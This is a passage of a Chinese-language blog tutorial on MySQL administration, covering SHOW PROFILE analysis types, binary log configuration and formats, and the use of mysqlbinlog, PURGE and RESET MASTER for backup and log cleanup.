<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000004</span> <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span>   <span class="token number">0.000001</span> <span class="token operator">|</span>
<span class="token operator">|</span> System lock                    <span class="token operator">|</span> <span class="token number">0.000029</span> <span class="token operator">|</span> <span class="token number">0.000015</span> <span class="token operator">|</span>   <span class="token number">0.000014</span> <span class="token operator">|</span>
<span class="token operator">|</span> optimizing                     <span class="token operator">|</span> <span class="token number">0.000007</span> <span class="token operator">|</span> <span class="token number">0.000004</span> <span class="token operator">|</span>   <span class="token number">0.000003</span> <span class="token operator">|</span>
<span class="token operator">|</span> statistics                     <span class="token operator">|</span> <span class="token number">0.000019</span> <span class="token operator">|</span> <span class="token number">0.000010</span> <span class="token operator">|</span>   <span class="token number">0.000009</span> <span class="token operator">|</span>
<span class="token operator">|</span> preparing                      <span class="token operator">|</span> <span class="token number">0.000018</span> <span class="token operator">|</span> <span class="token number">0.000009</span> <span class="token operator">|</span>   <span class="token number">0.000009</span> <span class="token operator">|</span>
<span class="token operator">|</span> executing                      <span class="token operator">|</span> <span class="token number">0.000004</span> <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span>   <span class="token number">0.000001</span> <span class="token operator">|</span>
<span class="token operator">|</span> Sending data                   <span class="token operator">|</span> <span class="token number">0.001413</span> <span class="token operator">|</span> <span class="token number">0.000345</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000006</span> <span class="token operator">|</span> <span class="token number">0.000005</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> Sending data                   <span class="token operator">|</span> <span class="token number">0.000159</span> <span class="token operator">|</span> <span class="token number">0.000163</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000006</span> <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> Sending data                   <span class="token operator">|</span> <span class="token number">0.000053</span> <span class="token operator">|</span> <span class="token number">0.000054</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> end                            <span class="token operator">|</span> <span class="token number">0.000005</span> <span class="token operator">|</span> <span class="token number">0.000004</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> query end                      <span class="token operator">|</span> <span class="token number">0.000007</span> <span class="token operator">|</span> <span class="token number">0.000006</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> closing tables                 <span class="token operator">|</span> <span class="token number">0.000009</span> <span class="token operator">|</span> <span class="token number">0.000009</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> freeing items                  <span class="token operator">|</span> <span class="token number">0.000008</span> <span class="token operator">|</span> <span class="token number">0.000008</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span> <span class="token number">0.000001</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> freeing items                  <span class="token operator">|</span> <span class="token number">0.000015</span> <span class="token operator">|</span> <span class="token number">0.000015</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> Waiting <span class="token keyword">for</span> query cache lock   <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> freeing items                  <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span> <span class="token number">0.000002</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> storing result <span class="token keyword">in</span> query cache  <span class="token operator">|</span> <span class="token number">0.000003</span> <span class="token operator">|</span> <span class="token number">0.000003</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
<span class="token operator">|</span> cleaning up                    <span class="token operator">|</span> <span class="token number">0.000003</span> <span class="token operator">|</span> <span class="token number">0.000003</span> <span class="token operator">|</span>   <span class="token number">0.000000</span> <span class="token operator">|</span>
+--------------------------------+----------+----------+------------+
<span class="token number">29</span> rows <span class="token keyword">in</span> set, <span class="token number">1</span> warning <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span></code></pre>

<p>除了可以查看 CPU 的耗时情况，还支持分析很多类型，例如：</p>
<table>
<thead>
<tr>
<th>分析类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>all</td>
<td>显示所有性能信息</td>
</tr>
<tr>
<td>block io</td>
<td>显示块 IO（块的输入输出）的次数</td>
</tr>
<tr>
<td>context switches</td>
<td>上下文切换相关开销</td>
</tr>
<tr>
<td>cpu</td>
<td>显示用户和系统的 cpu 的耗时情况</td>
</tr>
<tr>
<td>ipc</td>
<td>显示发送和接受的消息数量</td>
</tr>
<tr>
<td>memory</td>
<td>暂时还没有这个选项，未来可能有</td>
</tr>
<tr>
<td>page faults</td>
<td>显示主要和次要的页面故障</td>
</tr>
<tr>
<td>swaps</td>
<td>显示 swap 的次数</td>
</tr>
</tbody></table>
<p>分析多个类型时，使用逗号分割，例如：<code>show profile cpu,block io for query 10;</code></p>
<h3 id="二进制日志（备份）"><a href="#二进制日志（备份）" class="headerlink" title="二进制日志（备份）"></a>二进制日志（备份）</h3><p>生产中，上述日志都可以不开启，但是二进制日志一定要开启，因为二进制日志我们是当备份用的</p>
<ol>
<li>记录导致数据改变或潜在导致数据改变的 SQL 语句，例如 SELECT 语句是不会被记录的</li>
<li>记录已提交的事务，不会记录脏数据</li>
<li>不依赖于存储引擎</li>
</ol>
<p>注意区分二进制日志和事务日志</p>
<h4 id="相关配置选项"><a href="#相关配置选项" class="headerlink" title="相关配置选项"></a>相关配置选项</h4><pre class="language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">mysqld</span><span class="token punctuation">]</span></span>
<span class="token comment"># 设置二进制日志的路径，生产中应该设置单独的目录（磁盘）存放</span>
<span class="token key attr-name">log-bin</span> <span class="token punctuation">=</span> <span class="token value attr-value">/data/mysqlbinlog/mysql-bin</span>
<span class="token comment"># 二进制日志记录的格式，5.7默认MIXED，8.0默认ROW</span>
<span class="token key attr-name">binlog-format</span> <span class="token punctuation">=</span> <span class="token value attr-value">STATEMENT | ROW | MIXED</span>
<span class="token comment"># 二进制日志的最大值，字节为单位，默认1G</span>
<span class="token key attr-name">max-binlog-size</span> <span class="token punctuation">=</span> <span class="token value attr-value">1073741824</span>
<span class="token comment"># 为每个session分配的内存，用作事务的二进制日志缓存，默认1M</span>
<span class="token key attr-name">binlog-cache-size</span> <span class="token punctuation">=</span> <span class="token value attr-value">1048576</span>
<span class="token comment"># 限制最大缓存，默认16EB，保持默认值即可</span>
<span class="token key attr-name">max-binlog-cache-size</span> <span class="token punctuation">=</span> <span class="token value attr-value">18446744073709547520</span>
<span class="token comment"># 二进制日志是否即时同步到磁盘，默认0，由操作系统负责同步日志到磁盘</span>
<span class="token key attr-name">sync-binlog</span> <span class="token punctuation">=</span> <span class="token value attr-value">1 | 0</span>
<span class="token comment"># 二进制日志可以自动删除的天数。 默认为0，即不自动删除</span>
<span class="token key attr-name">expire-logs-days</span> <span class="token punctuation">=</span> <span class="token value attr-value">N</span></code></pre>

<p><code>log-bin = /data/mysqlbinlog/mysql-bin</code>：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@c71 mysqlbinlog<span class="token punctuation">]</span><span class="token variable">$ll</span> ./mysql-bin.*
-rw-r----- <span class="token number">1</span> mysql mysql  <span class="token number">177</span> Oct <span class="token number">16</span> <span class="token number">21</span>:37 ./mysql-bin.000001
-rw-r----- <span class="token number">1</span> mysql mysql <span class="token number">3683</span> Oct <span class="token number">16</span> <span class="token number">22</span>:38 ./mysql-bin.000002
-rw-r----- <span class="token number">1</span> mysql mysql  <span class="token number">228</span> Oct <span class="token number">22</span> 09:26 mysql-bin.index</code></pre>

<p><code>binlog-format = STATEMENT | ROW | MIXED</code>：</p>
<ul>
<li>statement：基于语句记录，日志量较少，但生产中不推荐使用，因为二进制日志是用来备份的，如果记录了类似<code>update table set time = now();</code>的语句，那将来恢复备份的时候 now()值就变了</li>
<li>row：基于行记录，日志量较大，例如上面的 update 操作，statement 模式原封不动的只记录一条语句，而 row 模式则记录每一条数据的更改，并且不会记录 now()，而是转成确切时间记录，所以 row 模式更加安全，生产中推荐使用</li>
<li>mixed：混合模式，让系统根据情况自行切换 statement 和 row 模式，这样即相对节省硬盘空间，也安全，但是万一系统判断错了呢，所以还是推荐使用 row 模式，确保万无一失</li>
</ul>
<p><code>max-binlog-size = 1073741824</code>：以下三种情况会切换二进制日志（就是生产一个新的二进制日志文件，后面的数据库更改操作记录在新的二进制日志文件中）</p>
<ul>
<li>重启数据库</li>
<li>二进制日志文件达到了 max_binlog_size 设置的值</li>
<li>执行<code>flush logs;</code>命令主动刷新所有日志</li>
</ul>
<p><code>binlog-cache-size = 1048576</code><br><code>max-binlog-cache-size = 18446744073709547520</code></p>
<p>当事务过大，所需缓存超过了<code>binlog-cache-size</code>分配的内存大小，会使用临时文件，如果超过了<code>max-binlog-cache-size</code>限制的最大值，则直接报错</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">10</span>:32:47<span class="token punctuation">(</span>root@localhost<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">></span> show global status like <span class="token string">'bin%'</span><span class="token punctuation">;</span>
+----------------------------+-------+
<span class="token operator">|</span> Variable_name              <span class="token operator">|</span> Value <span class="token operator">|</span>
+----------------------------+-------+
<span class="token operator">|</span> Binlog_cache_disk_use      <span class="token operator">|</span> <span class="token number">0</span>     <span class="token operator">|</span>
<span class="token operator">|</span> Binlog_cache_use           <span class="token operator">|</span> <span class="token number">0</span>     <span class="token operator">|</span>
<span class="token operator">|</span> Binlog_stmt_cache_disk_use <span class="token operator">|</span> <span class="token number">0</span>     <span class="token operator">|</span>
<span class="token operator">|</span> Binlog_stmt_cache_use      <span class="token operator">|</span> <span class="token number">0</span>     <span class="token operator">|</span>
+----------------------------+-------+
<span class="token number">4</span> rows <span class="token keyword">in</span> <span class="token builtin class-name">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

<span class="token comment"># Binlog_cache_disk_use表示因binlog_cache_size设计的内存不足导致缓存二进制日志用到了临时文件的次数</span>
<span class="token comment"># Binlog_cache_use表示用binlog_cache_size缓存的次数</span>
<span class="token comment"># 当Binlog_cache_disk_use值比较大的时候，可以考虑适当的调高binlog_cache_size的值</span></code></pre>

<h4 id="相关变量"><a href="#相关变量" class="headerlink" title="相关变量"></a>相关变量</h4><pre class="language-ini" data-language="ini"><code class="language-ini">09:40:36(root@localhost) [(none)]> select @@sql_log_bin;
+---------------+
| @@sql_log_bin |
+---------------+
|             1 |
+---------------+
1 row in set (0.00 sec)</code></pre>

<p>log-bin 配置选项是全局级别的，sql_log_bin 变量是会话级别的</p>
<h4 id="相关工具和命令"><a href="#相关工具和命令" class="headerlink" title="相关工具和命令"></a>相关工具和命令</h4><p><strong>mysqlbinlog</strong>：二进制日志的客户端命令工具，支持离线查看二进制日志</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">mysqlbinlog <span class="token punctuation">[</span>options<span class="token punctuation">]</span> log-files

--start-position<span class="token operator">=</span><span class="token comment"># 指定开始位置</span>
--stop-position<span class="token operator">=</span><span class="token comment">#</span>
--start-datetime<span class="token operator">=</span> <span class="token comment">#时间格式：YYYY-MM-DD hh:mm:ss</span>
--stop-datetime<span class="token operator">=</span>
--base64-output<span class="token punctuation">[</span><span class="token operator">=</span>name<span class="token punctuation">]</span>
<span class="token parameter variable">-v</span> <span class="token parameter variable">-vvv</span></code></pre>

<p>mysqlbinlog 可以用于简单的备份</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 备份 在Mysql5.5以下版本使用mysqlbinlog命令时如果报错，就加上"--no-defaults"选项</span>
<span class="token punctuation">[</span>root@c71 mysql<span class="token punctuation">]</span><span class="token variable">$mysqlbinlog</span> --no-defaults /data/mysql/mysql-bin.000014 <span class="token operator">></span> ~/test.sql
<span class="token comment"># 恢复</span>
<span class="token punctuation">[</span>root@c71 mysql<span class="token punctuation">]</span><span class="token variable">$mysql</span> <span class="token parameter variable">-uroot</span> <span class="token parameter variable">-plujinkai</span> <span class="token operator">&lt;</span> ~/test.sql</code></pre>

<p><strong>PURGE</strong>：清除指定二进制日志</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PURGE <span class="token punctuation">&#123;</span> BINARY <span class="token operator">|</span> MASTER <span class="token punctuation">&#125;</span> LOGS <span class="token punctuation">&#123;</span> TO <span class="token string">'log_name'</span> <span class="token operator">|</span> BEFORE datetime_expr <span class="token punctuation">&#125;</span></code></pre>

<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">PURGE</span> <span class="token keyword">BINARY</span> LOGS <span class="token keyword">TO</span> <span class="token string">'mariadb-bin.000003'</span><span class="token punctuation">;</span> <span class="token comment"># 删除mariadb-bin.000003之前的日志</span>
<span class="token keyword">PURGE</span> <span class="token keyword">BINARY</span> LOGS BEFORE <span class="token string">'2017-01-23'</span><span class="token punctuation">;</span>
<span class="token keyword">PURGE</span> <span class="token keyword">BINARY</span> LOGS BEFORE <span class="token string">'2017-03-22 09:25:30'</span><span class="token punctuation">;</span></code></pre>

<p><strong>RESET MASTER</strong>：删除所有二进制日志，index 文件重新计数，一般在完成备份后，可以执行此操作</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/8/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/10/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">鲁ICP备18016600号-1 </a>
  </div>

<div class="copyright">
  &copy; 2018 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">像方便面一样的男子</span>
</div>

    </div>
  </footer>

  
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="//s1.to2b.cn/libs/animejs/3.2.1/anime.min.js"></script>
  <script src="//s1.to2b.cn/libs/lozad.js/1.16.0/lozad.min.js"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/next-boot.js"></script>

  <script src="//s1.to2b.cn/libs/algoliasearch/4.11.0/algoliasearch-lite.umd.min.js"></script>
<script src="//s1.to2b.cn/libs/instantsearch.js/4.36.0/instantsearch.production.min.js"></script><script src="/js/third-party/search/algolia-search.js"></script>






  





</body>
</html>
